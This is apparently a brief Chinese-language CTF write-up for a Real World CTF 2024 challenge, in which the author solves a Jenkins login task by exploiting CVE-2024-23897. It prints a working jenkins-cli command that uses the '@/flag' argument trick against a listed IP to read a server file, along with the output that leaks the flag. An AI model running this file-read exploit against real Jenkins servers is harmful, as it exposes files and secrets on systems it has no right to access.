---
title: RW-be
date: 2024-02-05 00:42:37
tags: ["2024"]
categories: ["challenge"]
---

# Be-a-Security-Researcher

开局login


<!--more-->

![image-20240127234137808](./image-20240127234137808-1707064990173-1.png)

弱密码，sql，ssti，xss----no！



看大佬漏洞复现：https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html

```

C:\Users\18774\Desktop>java -jar jenkins-cli.jar -s http://47.96.171.129:8080 who-am-i "@/flag"

ERROR: No argument is allowed: **rwctf{jenkins_no_vulner!!}**

java -jar jenkins-cli.jar who-am-i

Reports your credential and permissions.


```

ok！
